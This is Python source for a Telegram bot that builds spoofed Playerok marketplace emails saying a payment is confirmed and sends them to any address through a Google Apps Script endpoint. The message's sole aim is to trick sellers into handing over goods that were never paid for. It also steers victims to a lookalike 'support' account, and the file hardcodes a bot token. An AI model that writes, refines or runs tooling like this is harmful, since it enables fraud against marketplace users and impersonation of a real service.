import asyncio, logging, aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = '8777068569:AAEl-874WqglkLNCl9Uyjc_VMApsNltS2Is'
GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwApBf3F8gJ34BGN5zvIlX_hPYkEz5K7aKDeoDH0pdE-I9TjCE-r2690IuTpl4OaJ9q/exec'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Состояния для ввода данных
class OrderState(StatesGroup):
    waiting_email = State()
    waiting_seller = State()
    waiting_amount = State()
    waiting_item = State()
    waiting_buyer = State()

# Твой кастомный дизайн письма
def get_html_template(seller, amount, item, buyer):
    s = seller.replace("@", "")
    b = buyer.replace("@", "")
    
    return f"""
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <style>
        :root {{
            --bg-dark: #0a0a0a; --bg-card: #141414; --header-blue: #3291ff;
            --header-cyan: #00c2ff; --playerok-blue: #3586ff; --text-main: #ffffff;
            --text-gray: #828282; --green-price: #00a651; --status-green-bg: #1a8944;
            --action-bg: #1c1814; --action-orange: #d29922; --action-text: #e19d55;
            --border: #262626; --seller-badge: #2a2444; --seller-text: #9a8cff;
        }}
        body {{ background-color: var(--bg-dark); color: var(--text-main); font-family: sans-serif; padding: 20px; margin: 0; }}
        .wrapper {{ max-width: 420px; margin: 0 auto; }}
        .header {{ background: linear-gradient(90deg, var(--header-blue) 0%, var(--header-cyan) 100%); border-radius: 20px 20px 10px 10px; padding: 24px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }}
        .header-title h2 {{ margin: 0; font-size: 21px; font-weight: 800; color: white; }}
        .header-title p {{ margin: 8px 0 0 0; font-size: 11px; opacity: 0.9; color: white; }}
        .logo {{ background: white; color: black; padding: 8px 12px; border-radius: 6px; font-weight: 900; font-size: 18px; }}
        .logo span {{ color: var(--playerok-blue); }}
        .card {{ background-color: var(--bg-card); border-radius: 22px; padding: 20px; margin-bottom: 12px; border: 1px solid var(--border); }}
        .hello {{ display: flex; justify-content: space-between; align-items: center; }}
        .seller-tag {{ background-color: var(--seller-badge); color: var(--seller-text); padding: 5px 12px; border-radius: 12px; font-size: 11px; font-weight: 700; }}
        .label {{ color: var(--text-gray); font-size: 13px; margin-bottom: 8px; }}
        .status-confirmed {{ background-color: var(--status-green-bg); color: white; padding: 7px 14px; border-radius: 10px; font-size: 13px; font-weight: 800; display: inline-block; margin-bottom: 15px; }}
        .price {{ color: var(--green-price); font-size: 28px; font-weight: 800; margin: 0 0 15px 0; }}
        .desc {{ color: var(--text-gray); font-size: 14px; line-height: 1.5; }}
        .detail-group {{ margin-bottom: 16px; }}
        .val {{ font-weight: 700; font-size: 14px; margin-top: 4px; display: block; color: white; }}
        .val-green {{ color: var(--green-price); font-weight: 800; }}
        .action-card {{ background-color: var(--action-bg); border-left: 4px solid var(--action-orange); }}
        .action-title {{ color: var(--action-text); font-size: 13px; font-weight: 800; text-transform: uppercase; margin-bottom: 10px; }}
        .buyer-chip {{ background: #111; padding: 3px 8px; border: 1px solid #333; border-radius: 6px; font-weight: 700; color: white; }}
        .sec-list {{ list-style: none; padding: 0; margin: 0 0 15px 0; font-size: 14px; color: #eee; }}
        .btn-tg {{ background: #111; border: 1px solid var(--border); text-align: center; padding: 14px; border-radius: 12px; font-weight: 700; color: white; text-decoration: none; display: block; }}
        .footer {{ text-align: center; color: var(--text-gray); font-size: 11px; margin-top: 10px; }}
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header">
        <div class="header-title">
            <h2>Playerok • Сделка</h2>
            <p>Системное уведомление • Оплата подтверждена</p>
        </div>
        <div class="logo">Player<span>ok</span></div>
    </div>
    <div class="card hello">
        <div style="font-weight: 700; font-size: 17px; color: white;"> Здравствуйте, @{s}</div>
        <div class="seller-tag">Seller</div>
    </div>
    <div class="card">
        <div class="label">Статус</div>
        <div class="status-confirmed"> ОПЛАТА ПОДТВЕРЖДЕНА</div>
        <div class="label">Сумма</div>
        <div class="price">{amount} ₽</div>
        <div class="desc">Оплата по сделке зафиксирована системой. Передайте товар покупателю и дождитесь подтверждения.</div>
    </div>
    <div class="card">
        <div class="label" style="margin-bottom: 18px;">Детали сделки</div>
        <div class="detail-group">
            <div class="label">Товар</div>
            <span class="val">{item}</span>
        </div>
        <div class="detail-group">
            <div class="label">Статус</div>
            <span class="val-green">Оплачено</span>
        </div>
        <div class="detail-group">
            <div class="label">Покупатель</div>
            <span class="val">@{b}</span>
        </div>
        <div class="detail-group">
            <div class="label">Сумма</div>
            <span class="val-green">{amount} ₽</span>
        </div>
    </div>
    <div class="card action-card">
        <div class="action-title">Действие сейчас</div>
        <div style="margin-bottom: 10px; font-size: 14px; color: white;">
            Передайте товар покупателю: <span class="buyer-chip">@{b}</span>
        </div>
        <div class="desc" style="font-size: 13px;">После подтверждения передачи средства зачислятся автоматически.</div>
    </div>
    <div class="card">
        <div class="label" style="margin-bottom: 15px;">Безопасность / Проверка</div>
        <ul class="sec-list">
            <li>Сверьте покупателя: <b>@{b}</b></li>
            <li>Мы не запрашиваем коды/пароли</li>
        </ul>
        <div class="btn-tg">Открыть поддержку в Telegram</div>
        <div class="footer">Официальный контакт: @Helper_PlayerOK</div>
        <div class="footer" style="opacity: 0.3; margin-top: 8px;"> 2026 Playerok</div>
    </div>
</div>
</body>
</html>
    """

# Функция отправки в Google
async def send_via_google(email, body):
    async with aiohttp.ClientSession() as session:
        payload = {"email": email, "body": body}
        async with session.post(GOOGLE_SCRIPT_URL, json=payload, timeout=30) as resp:
            return await resp.text()

# Обработчики
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    kb = InlineKeyboardBuilder().button(text="🚀 Создать уведомление", callback_data="start_order").as_markup()
    await message.answer("✅ Бот готов к работе с новым дизайном!", reply_markup=kb)

@dp.callback_query(F.data == "start_order")
async def start_order(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("1️⃣ Введите **Email** получателя:")
    await state.set_state(OrderState.waiting_email)
    await callback.answer()

@dp.message(OrderState.waiting_email)
async def step1(m: types.Message, state: FSMContext):
    await state.update_data(email=m.text)
    await m.answer(f"✅ Email: {m.text}\n2️⃣ Ник продавца:")
    await state.set_state(OrderState.waiting_seller)

@dp.message(OrderState.waiting_seller)
async def step2(m: types.Message, state: FSMContext):
    await state.update_data(seller=m.text)
    await m.answer(f"✅ Продавец: {m.text}\n3️⃣ Сумма:")
    await state.set_state(OrderState.waiting_amount)

@dp.message(OrderState.waiting_amount)
async def step3(m: types.Message, state: FSMContext):
    await state.update_data(amount=m.text)
    await m.answer(f"✅ Сумма: {m.text} ₽\n4️⃣ Товар:")
    await state.set_state(OrderState.waiting_item)

@dp.message(OrderState.waiting_item)
async def step4(m: types.Message, state: FSMContext):
    await state.update_data(item=m.text)
    await m.answer("5️⃣ Ник покупателя:")
    await state.set_state(OrderState.waiting_buyer)

@dp.message(OrderState.waiting_buyer)
async def step5_final(m: types.Message, state: FSMContext):
    data = await state.get_data()
    buyer = m.text
    await m.answer("⏳ **Отправка нового дизайна...**")
    try:
        html_body = get_html_template(data['seller'], data['amount'], data['item'], buyer)
        result = await send_via_google(data['email'], html_body)
        if "Success" in result:
            await m.answer(f"✅ **Письмо в новом стиле отправлено!**")
        else:
            await m.answer(f"❌ Ошибка: {result}")
    except Exception as e:
        await m.answer(f"❌ Ошибка: {e}")
    await state.clear()

async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
